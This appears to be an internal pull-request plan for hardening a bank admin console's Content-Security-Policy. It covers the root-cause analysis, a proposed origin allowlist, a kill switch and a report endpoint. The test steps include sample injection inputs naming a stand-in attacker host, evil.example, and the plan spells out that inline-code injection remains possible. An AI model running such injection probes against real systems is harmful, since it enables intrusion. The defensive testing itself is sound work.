# PART 1 — In simple words

## What the system does today
Every page we send to a browser carries a short "house rule" note called the Content-Security-Policy. It tells the browser where it may load things from (scripts, pictures, fonts) and who may show our page inside theirs. Think of it as a guest list at the door: only listed guests get in.

Today the note on production is a "practice mode" version (the browser only writes down breaches, it never blocks anything), and it lets in almost every guest: any website's scripts, any website's pictures, any website's data requests. Nothing collects what the browser writes down, so even the practice mode teaches us nothing.

## What is wrong with it
Because the guest list is "everyone", an attacker who manages to slip a bit of malicious code into one of our pages can make it load more attack code from their own website, steal what the page shows, or send it away. The security audit called this out: it looks like we are protected (a tool reports "CSP present") when we are not. For a bank-facing admin console that is a real exposure, not a theory.

Nothing has been exploited that we know of. This is a missing safety net.

## What we are going to change
We will replace the practice-mode note with a real one that the browser enforces:
- Only our own site may supply scripts, styles, fonts and pictures, plus a short list of outside services we genuinely need and cannot host ourselves (online payment widget, analytics, chatbot, QR image maker, the national payments agency's identity form).
- Plug-ins (Flash-style objects) are never allowed.
- Forms may only send data to our own site (plus the one national payments agency form we use).
- Nobody else may put our pages inside a frame.
- We add a small "complaints box" so the browser can tell us when it blocked something, so we can fix a missed guest quickly. It records only what was blocked and where, never any personal data.
- A single switch in the server settings can drop the new rule back to "practice mode" or off in seconds, with no new release. The last attempt on 23 Sep had to be undone by shipping another release.

## What could go wrong
- If a page uses an outside service we did not list, that part of the page stops working (a chart, a font, a button). The complaints box and the switch limit how long that lasts.
- **This change does not stop inline code** (code written directly inside the page). The site has about 1,500 such code blocks and about 3,800 click-handlers written inline, so we have to keep allowing them. That means an attacker who injects code directly into a page can still run it. The new rule closes the "load attack code from another website" door, not the "run code written into the page" door. Closing the second one is a rewrite of thousands of places and is not part of this PR.
- Last time (Dheeraj's attempt, merged 23 Sep and reverted the same day) the login page stopped working. The most likely reason is explained in PART 3. This plan avoids that mistake, but it must be tested on the login page first.

# PART 2 — The words used here

| Word | What it means, simply |
|---|---|
| CSP (Content-Security-Policy) | A note our server attaches to every page telling the browser what it may load or do. |
| Report-Only | "Practice mode": the browser notes breaches but blocks nothing. |
| Enforce | "Real mode": the browser actually blocks anything not on the list. |
| Inline script | JavaScript written directly inside the web page rather than in a separate file. |
| Inline handler | A tiny piece of code attached to a button, for example `onclick="doThing()"`. |
| Origin | A website address (for example `https://checkout.razorpay.com`). The list of allowed origins is the "guest list". |
| `'unsafe-inline'` | A CSP setting that allows inline code. Needed here because the pages depend on it. |
| Nonce | A one-time code that lets specific inline scripts through without allowing all of them. Cannot cover inline handlers. |
| Kill switch | A server setting that turns the rule down or off without a new release. |

# PART 3 — The technical version

## Root cause

Everything below is on **production (`origin/onestackcbs`, fetched 9 Oct)**.

1. **Header comes from `index.php`, not `.htaccess`.**
   - `index.php:17-29` builds `Content-Security-Policy-Report-Only` and sends it with `header($cspHeader, true)` (`index.php:29`). The policy:
     ```php
     "script-src 'self' 'unsafe-inline' 'unsafe-eval' http: https:; "
     "style-src 'self' 'unsafe-inline' http: https:; "
     "connect-src 'self' http: https:; ... frame-ancestors 'none'; "
     ```
     `http: https:` means **any website** may supply scripts, styles, fonts, images and data connections. That is the hollow part. It has no `report-uri`/`report-to`.
   - `.htaccess:5` and `:199-202` have the CSP lines **commented out** ("Handled dynamically in index.php").
   - Live check by Shikhar on 9 Oct: `curl -sI https://admin.onestack.in/auth/login` returns exactly the Report-Only header above, no enforced CSP header; `grep -n -i content-security /var/www/vhosts/onecbs-prod/.htaccess` returns only the two commented lines (5, 202). So **repo and server match; `index.php` is the single source.** (The 24 Aug screenshots are from before commit `47fa2c2492` / PR 13479, merged 1 Oct.)
2. **`CSP_NONCE` is generated and never used.** `index.php:10-11` defines it; `git grep CSP_NONCE origin/onestackcbs` finds only that definition. Do not add it to `script-src`: a nonce makes browsers ignore `'unsafe-inline'`, which would break ~1,500 inline blocks.
3. **Why Dheeraj's attempt (PR 13316, merged 23 Sep, reverted by PR 13320 the same day) broke login.** His `.htaccess` change (diff lines 1-23) sent an enforced policy with `script-src 'self' https://onestack.in https://*.onestack.in` — **no `'unsafe-inline'`** — plus `style-src ... 'unsafe-inline'`, `font-src 'self' data: <own>` and `form-action 'self'`. `application/views/auth/login-page.php:754` is an inline `<script type="text/javascript">` (the only inline script in the file; 0 inline handlers) and the login form posts via AJAX (`form_open('#', ...)` at login-page.php ~566). Under his `script-src` that inline block cannot run, so the login button does nothing. **This is the strongest explanation from the code; it is not confirmed** (no logs read — local logs are not evidence, and nobody recorded the actual error). His policy also blocked every outside origin (fonts, GA, Razorpay). So the failure was "enforced a no-inline policy on a site built on inline code".
4. **Scale of inline code on production** (`git grep -P` on `origin/onestackcbs`, `application/`):
   - `<script>` blocks without `src=`: **1,493 blocks in 1,234 files**.
   - Inline handlers `on(click|change|submit|load|keyup|keydown|keypress|blur|focus|mouseover|mouseout|input|error|select)=`: **3,788 occurrences in 579 files** (raw regex; includes handlers written inside JS strings, so "about").
   - `href="javascript:..."`: 182 files.
   Nonces/hashes cannot cover inline handlers, so removing `'unsafe-inline'` means rewriting ~3,800 handlers. **Out of scope for this PR; the task's `script-src` allowlist is achieved as an origin allowlist, with `'unsafe-inline'` kept.**
5. **Real third parties still referenced (not in comments)**, verified at file:line on production:
   - Google Analytics gtag: `modules/mobile_app/views/frontend/apk_poster_download.php:48`, `.../frontend/deregister_device.php:235`, `.../frontend/sideload.php:274`, `views/frontend/deregister_device.php:235`, `views/frontend/sideload.php:246` (`https://www.googletagmanager.com/gtag/js?id=G-2BD2YCNHNN`).
   - Razorpay checkout: `views/pages/razorpay_view.php:2` (`https://checkout.razorpay.com/v1/checkout.js`, which itself frames `api.razorpay.com` and calls razorpay endpoints).
   - Haptik chatbot: `views/frontend/chatbot.php:50`, `modules/mobile_app/views/frontend/chatbot.php:49` (`https://toolassets.haptikapi.com/...loader.js`). The full set of hosts the widget calls is **not verified**.
   - QR image: `views/frontend/sideload.php:324` (`https://chart.googleapis.com/chart?...`) — live `<img>`; the `modules/mobile_app` copy at :353 is commented out.
   - NPCI eKYC form posting cross-site: `modules/cbs/views/aeps/webinterface.php:72` (`<form action="https://globalcertzone.npci.org.in:443/eKyc_setu/static/aeps/entity/" method="POST" ...>`) — `form-action 'self'` would block it.
   - Not live (all commented out, no policy entry needed): jsdelivr `html-docx-js` (`views/banl_agreements/*`, `npci_agreements/NDA.php`), `www.google.com/jsapi`, `ajax.googleapis.com`, `cdnjs.cloudflare.com` (`admin/_templates/header.php:33,84,112`).
   - Still live and external at the time of the grep: `cdn.datatables.net` in `product-managment/share-certificate.php:3-4` and `service-managment/locker-availability.php:78`. Open PR 13621 (SEC-036, branch `sg_cl_sri_datatables_cdn`) removes/pins those; **this PR assumes it lands first** and adds no datatables entry.
   - Google Fonts (`fonts.googleapis.com` 90 hits, `fonts.gstatic.com` 45 hits in `href=`) are still on production. Per Shikhar, fonts/CDN files are now local on his branch; this PR assumes that. If any remain at deploy time they show up in the reports and the kill switch covers them (see Plan step 6).
6. **Iframes:** only 2, both `<iframe name="download_iframe" style="display:none;">` (`monthly-bank-performance.php:166` in two folders) — own origin, no external `frame-src` needed for them. `X-Frame-Options: DENY` is already sent at `index.php:7`, so `frame-ancestors 'none'` changes nothing for existing behaviour.
7. **`eval`:** the only `eval(`/`new Function(` in non-minified own code is PHP `third_party/MX/Loader.php` (server-side, irrelevant to the browser). Minified libraries were not scanned; `'unsafe-eval'` removal must be confirmed by the browser test below.
8. **Other CSP headers in the repo:** `modules/mobile_app/controllers/npci-upi/NpciMobileAPIV6.php:19` already sends its own strict CSP for that endpoint — leave alone. Two CSP headers on one response are both applied (intersection), so the new header is additive there.
9. **Interaction with other open work:**
   - Open PR 13522 (branch `sg_cl_security_headers_single_source`, task DUAL-01) adds two `header()` calls to `index.php` after line 30. Same file, adjacent lines → a trivial merge conflict is possible; whichever merges second resolves by hand.
   - CSRF work (PR 13493, `sg_cl_csrf_token_support`): when `csrf_protection` is later switched on, the new `csp-report` URL must be in its exclude list (browsers post reports without a token). One line; note it on that PR, not here.
   - Single login: on production `application/config/routes.php:58` already has the `single-login` route commented out; Shikhar removed the rest on his branch, so `form-action 'self'` no longer breaks the console hand-off.

## How it will be fixed

In `index.php` only (plus one small controller and one route for reports):

1. Move the CSP block to run **after** `load_env()` so it can read an optional `CSP_MODE` from `.env`. `.env` is not tracked in git (not in `git ls-tree origin/onestackcbs`); `load_env()` at `index.php:61-86` fills `$_ENV`/`$_SERVER` like the existing `GOOGLE_ANALYTICAL_KEY` usage at `:47`.
2. Replace the policy with an origin allowlist. Proposed (origins to be re-confirmed by the browser test):
   ```
   default-src 'self';
   script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://checkout.razorpay.com https://toolassets.haptikapi.com;
   style-src 'self' 'unsafe-inline';
   font-src 'self' data:;
   img-src 'self' data: blob: https://chart.googleapis.com https://www.googletagmanager.com https://*.google-analytics.com;
   connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.razorpay.com https://*.haptikapi.com;
   frame-src 'self' https://api.razorpay.com;
   object-src 'none'; base-uri 'self';
   form-action 'self' https://globalcertzone.npci.org.in;
   frame-ancestors 'none';
   upgrade-insecure-requests;   (HTTPS only, as today)
   report-uri /csp-report
   ```
   `'unsafe-eval'` is **dropped** unless the browser test shows a library needs it (then keep it and note it). `http:`/`https:` wildcards are removed everywhere. Haptik's remaining hosts are **not verified**; the chatbot page must be loaded under the new policy and any block added.
3. Header name chosen by `CSP_MODE`: `enforce` (default when unset) sends `Content-Security-Policy`; `report-only` sends `Content-Security-Policy-Report-Only`; `off` sends nothing. Deploy first with `CSP_MODE=report-only` in the server `.env`, check reports for a day, then remove the line (or set `enforce`). One release, no code change to flip.
4. New `application/controllers/CspReport.php` (`extends CI_Controller`, 41 other controllers already extend it directly, avoiding the heavy `MY_Controller` bootstrap that loads `ProductMaster`/`PartnerMaster` on every request) with `index()` that: accepts POST only, reads `php://input` (reject over 8 KB), `json_decode`s the `csp-report` object, and logs through `AppLog` (`$this->load->library('AppLog'); $this->applog->info('CSP', ...)` — the call pattern used in `libraries/npci_upi/Chktxn/Cbs_chktxn.php:13,162`) only `effective-directive`, `blocked-uri` and `document-uri` with **query string and fragment stripped**, plus `source-file` (stripped) and `line-number`. Never log `referrer`, `script-sample`, cookies or any user data (project rule: no PII in logs; URLs can carry tokens). Responds `204`.
5. Route in `application/config/routes.php`: `$route['csp-report'] = 'CspReport/index';` (same style as neighbouring lines; confirm no `<ENVIRONMENT>/routes.php` overrides it).

## How to test
Run in order (these are executed by `/task-do` and `/task-check`):
```
php -l index.php
php -l application/controllers/CspReport.php
powershell -File .claude/bin/verify.ps1
```
Header modes (local XAMPP, adjust host):
```
curl -sI http://localhost/auth/login | grep -i content-security
#  expect: one Content-Security-Policy header, no http:/https: wildcards, no 'unsafe-eval', ends with report-uri /csp-report
#  (no upgrade-insecure-requests on plain HTTP, as before)
# set CSP_MODE=report-only in the local .env, repeat -> header name is Content-Security-Policy-Report-Only
# set CSP_MODE=off -> no Content-Security-Policy* header at all
```
Report endpoint:
```
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost/csp-report -H "Content-Type: application/csp-report" -d '{"csp-report":{"effective-directive":"script-src","blocked-uri":"https://evil.example/x.js?token=abc","document-uri":"http://localhost/auth/login?x=1"}}'
#  expect 204; the log line contains blocked-uri/document-uri WITHOUT "?token=abc" / "?x=1" and nothing else
curl -s -o /dev/null -w "%{http_code}\n" http://localhost/csp-report          # GET -> expect non-2xx (rejected)
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost/csp-report -d "$(head -c 20000 /dev/zero | tr '\0' a)"   # oversize -> expect rejected
```
Browser (Chrome, DevTools Console): complete the section-5 page list above. **Pass = login works, and no "Refused to load/execute/connect" lines for any resource that the page needs.** Then confirm a deliberate breach IS blocked: in the console run `var s=document.createElement('script');s.src='https://evil.example/x.js';document.body.appendChild(s)` and expect "Refused to load the script". Nothing else should be affected: also check the Network tab shows the report POST going to `/csp-report` when something is blocked.
Production (read-only, after deploy): `curl -sI https://admin.onestack.in/auth/login | grep -i content-security` and `curl -sI https://rbank.in/auth/login | grep -i content-security`; a day later `grep -h CSP application/logs/* | head` to see what was blocked (on the server, read-only).
